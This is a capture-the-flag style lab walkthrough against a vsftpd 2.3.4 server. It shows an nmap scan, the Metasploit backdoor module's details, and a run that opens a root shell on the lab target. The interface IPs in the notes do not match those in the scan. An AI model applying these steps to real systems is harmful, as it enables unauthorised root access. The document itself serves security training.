# Vulnerable FTP Server

## Instructions: 

- This lab is dedicated to you! No other users are on this network :) 
- Once you start the lab, you will have access to a root terminal of a Kali instance
- Your Kali has an interface with IP address 192.X.Y.Z. Run "ip addr" to know the values of X and Y.
The target server should be located at the IP address 192.X.Y.3. 
- Do not attack the gateway located at IP address 192.X.Y.1 
- postgresql is not running by default so Metasploit may give you an error about this when starting

## Notes

- **eth1**: inet 192.113.52.2  netmask 255.255.255.0  broadcast 192.113.52.255

## Nmap (sudo nmap -p- -vv -T4 -sC -sV 192.33.67.3)

    Scanning 192.33.67.3 [1 port]
    Completed ARP Ping Scan at 22:32, 0.04s elapsed (1 total hosts)
    `Discovered open port 21/tcp on 192.33.67.3`
    PORT   STATE SERVICE REASON         VERSION
    21/tcp open  ftp     syn-ack ttl 64 vsftpd 2.3.4
    |_ftp-anon: got code 500 "OOPS: cannot change directory:/nonexistent".
    MAC Address: 02:42:C0:71:34:03 (Unknown)
    Service Info: OS: Unix

## MSFCONSOLE (unix/ftp/vsftpd_234_backdoor)

    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > info

        Name: VSFTPD v2.3.4 Backdoor Command Execution
        Module: exploit/unix/ftp/vsftpd_234_backdoor
    Platform: Unix
        Arch: cmd
    Privileged: Yes
        License: Metasploit Framework License (BSD)
        Rank: Excellent
    Disclosed: 2011-07-03

    Provided by:
    hdm <x@hdm.io>
    MC <mc@metasploit.com>

    Available targets:
    Id  Name
    --  ----
    0   Automatic

    Check supported:
    No

    Basic options:
    Name    Current Setting  Required  Description
    ----    ---------------  --------  -----------
    RHOSTS                   yes       The target address range or CIDR identifier
    RPORT   21               yes       The target port (TCP)

    Payload information:
    Space: 2000
    Avoid: 0 characters

    Description:
    This module exploits a malicious backdoor that was added to the 
    VSFTPD download archive. This backdoor was introduced into the 
    vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
    according to the most recent information available. This backdoor 
    was removed on July 3rd 2011.

    References:
    CVE: Not available
    OSVDB (73573)
    http://pastebin.com/AetT9sS5
    http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

## unix/ftp/vsftpd_234_backdoor 

    msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

    [*] 192.33.67.3:21 - Banner: 220 (vsFTPd 2.3.4)
    [*] 192.33.67.3:21 - USER: 331 Please specify the password.
    [+] 192.33.67.3:21 - Backdoor service has been spawned, handling...
    [+] 192.33.67.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
    [*] Found shell.
    [*] Command shell session 1 opened (192.33.67.2:45899 -> 192.33.67.3:6200) at 2022-04-04 22:40:39 +0000

    whoami
    root

